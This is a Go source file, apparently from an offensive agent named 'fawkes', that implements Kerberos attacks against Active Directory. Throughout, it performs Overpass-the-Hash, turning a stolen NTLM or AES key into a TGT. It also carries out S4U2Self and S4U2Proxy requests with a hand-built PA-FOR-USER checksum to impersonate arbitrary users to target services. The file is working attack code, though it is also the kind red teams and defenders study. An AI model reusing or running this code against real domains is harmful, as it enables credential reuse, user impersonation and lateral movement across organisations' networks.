// ticket_kdc.go contains KDC communication, Kerberos protocol functions
// (OPtH, S4U2Self, S4U2Proxy), error handling, and PA-FOR-USER construction.

package commands

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/msgtype"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/iana/patype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

func ticketKrbErrorMsg(code int32) string {
	switch code {
	case 6:
		return "KDC_ERR_C_PRINCIPAL_UNKNOWN — client not found in Kerberos database"
	case 12:
		return "KDC_ERR_POLICY — KDC policy rejects request"
	case 13:
		return "KDC_ERR_BADOPTION — KDC cannot accommodate requested option (check delegation config)"
	case 15:
		return "KDC_ERR_SUMTYPE_NOSUPP — checksum type not supported"
	case 18:
		return "KDC_ERR_CLIENT_REVOKED — account disabled or locked"
	case 23:
		return "KDC_ERR_KEY_EXPIRED — password/key has expired"
	case 24:
		return "KDC_ERR_PREAUTH_FAILED — wrong key or pre-authentication failed"
	case 25:
		return "KDC_ERR_PREAUTH_REQUIRED — pre-authentication required"
	case 31:
		return "KRB_AP_ERR_SKEW — clock skew too great between client and KDC"
	case 41:
		return "KRB_AP_ERR_BAD_INTEGRITY — integrity check on decrypted field failed"
	case 68:
		return "KDC_ERR_WRONG_REALM — wrong realm"
	default:
		return fmt.Sprintf("Kerberos error code %d", code)
	}
}

// ticketParseKeyType validates key type and length, returns etype ID and config name.
func ticketParseKeyType(keyType string, keyBytes []byte) (int32, string, *structs.CommandResult) {
	switch strings.ToLower(keyType) {
	case "aes256":
		if len(keyBytes) != 32 {
			return 0, "", &structs.CommandResult{
				Output:    fmt.Sprintf("Error: AES256 key must be 32 bytes, got %d", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
		return 18, "aes256-cts-hmac-sha1-96", nil
	case "aes128":
		if len(keyBytes) != 16 {
			return 0, "", &structs.CommandResult{
				Output:    fmt.Sprintf("Error: AES128 key must be 16 bytes, got %d", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
		return 17, "aes128-cts-hmac-sha1-96", nil
	case "rc4", "ntlm":
		if len(keyBytes) != 16 {
			return 0, "", &structs.CommandResult{
				Output:    fmt.Sprintf("Error: RC4/NTLM key must be 16 bytes, got %d", len(keyBytes)),
				Status:    "error",
				Completed: true,
			}
		}
		return 23, "rc4-hmac", nil
	default:
		return 0, "", &structs.CommandResult{
			Output:    fmt.Sprintf("Error: unknown key_type %q. Use: aes256, aes128, rc4", keyType),
			Status:    "error",
			Completed: true,
		}
	}
}

// ticketOPtH performs Overpass-the-Hash to get a TGT, returning the ticket and session key.
func ticketOPtH(username, realm string, etypeID int32, etypeCfgName string, userKey types.EncryptionKey, kdcAddr string) (messages.Ticket, types.EncryptionKey, error) {
	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n  forwardable = true\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
	cfg, err := config.NewFromString(cfgStr)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("config: %v", err)
	}

	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{username},
	}
	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REQ: %v", err)
	}
	asReq.ReqBody.EType = []int32{etypeID}

	// PA-ENC-TIMESTAMP
	paTS := types.PAEncTSEnc{PATimestamp: time.Now().UTC()}
	paTSBytes, err := asn1.Marshal(paTS)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-ENC-TIMESTAMP marshal: %v", err)
	}
	encTS, err := crypto.GetEncryptedData(paTSBytes, userKey, keyusage.AS_REQ_PA_ENC_TIMESTAMP, 0)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-ENC-TIMESTAMP encrypt: %v", err)
	}
	encTSBytes, err := asn1.Marshal(encTS)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-ENC-TIMESTAMP bytes: %v", err)
	}
	asReq.PAData = types.PADataSequence{
		{PADataType: 2, PADataValue: encTSBytes},
	}

	// Send AS-REQ
	respBuf, err := ticketKDCSend(asReq.Marshal, kdcAddr)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, err
	}

	// Check for KRB-ERROR
	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		return messages.Ticket{}, types.EncryptionKey{}, ticketParseKRBError(respBuf)
	}

	// Parse AS-REP
	var asRep messages.ASRep
	if err := asRep.Unmarshal(respBuf); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REP parse: %v", err)
	}

	plainBytes, err := crypto.DecryptEncPart(asRep.EncPart, userKey, 3)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REP decrypt: %v", err)
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("AS-REP EncPart parse: %v", err)
	}

	return asRep.Ticket, decPart.Key, nil
}

// ticketKDCSend marshals a message, sends it to the KDC over TCP, and returns the response.
// Retries once on empty response (transient KDC issue).
func ticketKDCSend(marshalFn func() ([]byte, error), kdcAddr string) ([]byte, error) {
	reqBytes, err := marshalFn()
	if err != nil {
		return nil, fmt.Errorf("marshal: %v", err)
	}

	var lastErr error
	for attempt := 0; attempt < 2; attempt++ {
		if attempt > 0 {
			jitterSleep(1500*time.Millisecond, 3*time.Second)
		}
		resp, err := ticketKDCSendRaw(reqBytes, kdcAddr)
		if err != nil {
			lastErr = err
			continue
		}
		if len(resp) == 0 {
			lastErr = fmt.Errorf("KDC returned empty response (SPN may not exist — try FQDN)")
			continue
		}
		return resp, nil
	}
	return nil, lastErr
}

func ticketKDCSendRaw(reqBytes []byte, kdcAddr string) ([]byte, error) {
	conn, err := net.DialTimeout("tcp", kdcAddr, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connect to KDC %s: %v", kdcAddr, err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(15 * time.Second))

	// TCP Kerberos framing: 4-byte length prefix
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
	if _, err := conn.Write(lenBuf); err != nil {
		return nil, fmt.Errorf("send length: %v", err)
	}
	if _, err := conn.Write(reqBytes); err != nil {
		return nil, fmt.Errorf("send data: %v", err)
	}

	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return nil, fmt.Errorf("read response length: %v", err)
	}
	respLen := binary.BigEndian.Uint32(lenBuf)
	if respLen > 1048576 {
		return nil, fmt.Errorf("response too large (%d bytes)", respLen)
	}
	respBuf := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respBuf); err != nil {
		return nil, fmt.Errorf("read response: %v", err)
	}

	return respBuf, nil
}

// ticketParseKRBError parses a KRB-ERROR response buffer into a human-readable error.
func ticketParseKRBError(buf []byte) error {
	var krbErr messages.KRBError
	if err := krbErr.Unmarshal(buf); err != nil {
		return fmt.Errorf("KDC returned error (unparseable)")
	}
	errMsg := ticketKrbErrorMsg(krbErr.ErrorCode)
	if krbErr.EText != "" {
		errMsg += ": " + krbErr.EText
	}
	return fmt.Errorf("KDC error: %s (code %d)", errMsg, krbErr.ErrorCode)
}

// ticketS4U2Self performs S4U2Self: requests a TGS for an impersonated user to the
// service account itself. Returns the S4U2Self ticket and its session key.
func ticketS4U2Self(serviceUser, targetUser, realm string, etypeID int32, etypeCfgName string, tgt messages.Ticket, sessionKey types.EncryptionKey, kdcAddr string) (messages.Ticket, types.EncryptionKey, error) {
	cfgStr := fmt.Sprintf("[libdefaults]\n  default_realm = %s\n  dns_lookup_kdc = false\n  dns_lookup_realm = false\n  default_tkt_enctypes = %s\n  default_tgs_enctypes = %s\n  forwardable = true\n[realms]\n  %s = {\n    kdc = %s\n  }\n",
		realm, etypeCfgName, etypeCfgName, realm, kdcAddr)
	cfg, err := config.NewFromString(cfgStr)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("config: %v", err)
	}

	// Build TGS-REQ for S4U2Self: SName = service account itself
	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{serviceUser},
	}
	sname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{serviceUser},
	}
	tgsReq, err := messages.NewTGSReq(cname, realm, cfg, tgt, sessionKey, sname, false)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REQ build: %v", err)
	}

	// Set Forwardable flag
	types.SetFlag(&tgsReq.ReqBody.KDCOptions, flags.Forwardable)

	// Build PA-FOR-USER padata for S4U2Self
	paForUser, err := ticketBuildPAForUser(targetUser, realm, sessionKey)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("PA-FOR-USER: %v", err)
	}
	tgsReq.PAData = append(tgsReq.PAData, paForUser)

	// Send TGS-REQ
	respBuf, err := ticketKDCSend(tgsReq.Marshal, kdcAddr)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, err
	}

	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		return messages.Ticket{}, types.EncryptionKey{}, ticketParseKRBError(respBuf)
	}

	// Parse TGS-REP
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBuf); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REP parse: %v", err)
	}

	// Decrypt TGS-REP EncPart using TGT session key (key usage 8)
	plainBytes, err := crypto.DecryptEncPart(tgsRep.EncPart, sessionKey, keyusage.TGS_REP_ENCPART_SESSION_KEY)
	if err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REP decrypt: %v", err)
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return messages.Ticket{}, types.EncryptionKey{}, fmt.Errorf("TGS-REP EncPart parse: %v", err)
	}

	return tgsRep.Ticket, decPart.Key, nil
}

// ticketS4U2Proxy performs S4U2Proxy: uses the S4U2Self ticket to request a TGS
// for the target service on behalf of the impersonated user.
// Builds the TGS-REQ manually because gokrb5's NewTGSReq computes the authenticator
// checksum over the body before we can add AdditionalTickets and cname-in-addl-tkt.
func ticketS4U2Proxy(serviceUser, targetSPN, realm string, etypeID int32, etypeCfgName string, tgt messages.Ticket, sessionKey types.EncryptionKey, s4uSelfTicket messages.Ticket, kdcAddr string) (messages.Ticket, messages.EncKDCRepPart, error) {
	// Parse target SPN into PrincipalName
	spnParts := strings.SplitN(targetSPN, "/", 2)
	targetSName := types.PrincipalName{
		NameType:   nametype.KRB_NT_SRV_INST,
		NameString: spnParts,
	}

	cname := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{serviceUser},
	}

	// Build the ReqBody FIRST with all options, THEN compute authenticator
	nonceBuf := make([]byte, 4)
	_, _ = rand.Read(nonceBuf)
	nonce := int(binary.BigEndian.Uint32(nonceBuf))
	if nonce < 0 {
		nonce = -nonce
	}

	reqBody := messages.KDCReqBody{
		KDCOptions:        types.NewKrbFlags(),
		Realm:             realm,
		SName:             targetSName,
		Till:              time.Now().UTC().Add(24 * time.Hour),
		Nonce:             nonce,
		EType:             []int32{etypeID},
		AdditionalTickets: []messages.Ticket{s4uSelfTicket},
	}

	// Set KDC options BEFORE authenticator checksum
	types.SetFlag(&reqBody.KDCOptions, flags.Forwardable)
	types.SetFlag(&reqBody.KDCOptions, flags.Canonicalize)
	// cname-in-addl-tkt (bit 14) tells the KDC to use cname from AdditionalTickets
	types.SetFlag(&reqBody.KDCOptions, 14)

	// Marshal body for authenticator checksum
	bodyBytes, err := reqBody.Marshal()
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("marshal body: %v", err)
	}

	// Build authenticator with checksum over the body
	auth, err := types.NewAuthenticator(realm, cname)
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("authenticator: %v", err)
	}
	etype, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("etype: %v", err)
	}
	cksum, err := etype.GetChecksumHash(sessionKey.KeyValue, bodyBytes, keyusage.TGS_REQ_PA_TGS_REQ_AP_REQ_AUTHENTICATOR_CHKSUM)
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("checksum: %v", err)
	}
	auth.Cksum = types.Checksum{
		CksumType: etype.GetHashID(),
		Checksum:  cksum,
	}

	// Encrypt authenticator
	authBytes, err := auth.Marshal()
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("marshal auth: %v", err)
	}
	encAuth, err := crypto.GetEncryptedData(authBytes, sessionKey, keyusage.TGS_REQ_PA_TGS_REQ_AP_REQ_AUTHENTICATOR, tgt.EncPart.KVNO)
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("encrypt auth: %v", err)
	}

	// Build AP-REQ
	apReq := messages.APReq{
		PVNO:                   iana.PVNO,
		MsgType:                msgtype.KRB_AP_REQ,
		APOptions:              types.NewKrbFlags(),
		Ticket:                 tgt,
		EncryptedAuthenticator: encAuth,
	}
	apReqBytes, err := apReq.Marshal()
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("marshal AP-REQ: %v", err)
	}

	// Assemble TGS-REQ
	tgsReq := messages.TGSReq{
		KDCReqFields: messages.KDCReqFields{
			PVNO:    iana.PVNO,
			MsgType: msgtype.KRB_TGS_REQ,
			PAData: types.PADataSequence{
				{PADataType: patype.PA_TGS_REQ, PADataValue: apReqBytes},
			},
			ReqBody: reqBody,
		},
	}

	// Send TGS-REQ
	respBuf, err := ticketKDCSend(tgsReq.Marshal, kdcAddr)
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, err
	}

	if len(respBuf) > 0 && respBuf[0] == 0x7e {
		return messages.Ticket{}, messages.EncKDCRepPart{}, ticketParseKRBError(respBuf)
	}

	// Parse TGS-REP
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBuf); err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REP parse: %v", err)
	}

	// Decrypt TGS-REP using TGT session key (key usage 8)
	plainBytes, err := crypto.DecryptEncPart(tgsRep.EncPart, sessionKey, keyusage.TGS_REP_ENCPART_SESSION_KEY)
	if err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REP decrypt: %v", err)
	}
	var decPart messages.EncKDCRepPart
	if err := decPart.Unmarshal(plainBytes); err != nil {
		return messages.Ticket{}, messages.EncKDCRepPart{}, fmt.Errorf("TGS-REP EncPart parse: %v", err)
	}

	return tgsRep.Ticket, decPart, nil
}

// ticketBuildPAForUser constructs the PA-FOR-USER padata for S4U2Self.
// Per MS-SFU 2.2.1: PA-FOR-USER contains userName, userRealm, cksum, auth-package.
// Checksum uses KERB_CHECKSUM_HMAC_MD5 (-138) per RFC 4757 Section 4.
func ticketBuildPAForUser(targetUser, realm string, sessionKey types.EncryptionKey) (types.PAData, error) {
	targetCName := types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{targetUser},
	}

	// Build S4UByteArray per MS-SFU 2.2.1
	var s4uByteArray []byte
	// Name type (4 bytes, little-endian)
	ntBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(ntBuf, uint32(targetCName.NameType))
	s4uByteArray = append(s4uByteArray, ntBuf...)
	// Each name component (UTF-8 bytes, no null terminators)
	for _, s := range targetCName.NameString {
		s4uByteArray = append(s4uByteArray, []byte(s)...)
	}
	// Realm (UTF-8 bytes)
	s4uByteArray = append(s4uByteArray, []byte(realm)...)
	// Auth-package: "Kerberos"
	s4uByteArray = append(s4uByteArray, []byte("Kerberos")...)

	// Compute KERB_CHECKSUM_HMAC_MD5 per RFC 4757 Section 4:
	// Step 1: Ksign = HMAC-MD5(sessionKey, "signaturekey\0")
	ksignMac := hmac.New(md5.New, sessionKey.KeyValue)
	ksignMac.Write([]byte("signaturekey\x00"))
	ksign := ksignMac.Sum(nil)

	// Step 2: tmp = MD5(usage_LE || S4UByteArray) where usage = 17
	usageBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(usageBuf, 17)
	md5Hash := md5.New()
	md5Hash.Write(usageBuf)
	md5Hash.Write(s4uByteArray)
	tmp := md5Hash.Sum(nil)

	// Step 3: CHKSUM = HMAC-MD5(Ksign, tmp)
	finalMac := hmac.New(md5.New, ksign)
	finalMac.Write(tmp)
	cksumValue := finalMac.Sum(nil)

	cksum := types.Checksum{
		CksumType: -138, // HMAC-MD5 (checksum type for PA-FOR-USER per MS-SFU)
		Checksum:  cksumValue,
	}

	// ASN.1 encode PA-FOR-USER
	type paForUserASN1 struct {
		UserName    types.PrincipalName `asn1:"explicit,tag:0"`
		UserRealm   string              `asn1:"generalstring,explicit,tag:1"`
		Cksum       types.Checksum      `asn1:"explicit,tag:2"`
		AuthPackage string              `asn1:"generalstring,explicit,tag:3"`
	}

	pafu := paForUserASN1{
		UserName:    targetCName,
		UserRealm:   realm,
		Cksum:       cksum,
		AuthPackage: "Kerberos",
	}

	pafuBytes, err := asn1.Marshal(pafu)
	if err != nil {
		return types.PAData{}, fmt.Errorf("marshal PA-FOR-USER: %v", err)
	}

	return types.PAData{
		PADataType:  129, // PA_FOR_USER
		PADataValue: pafuBytes,
	}, nil
}
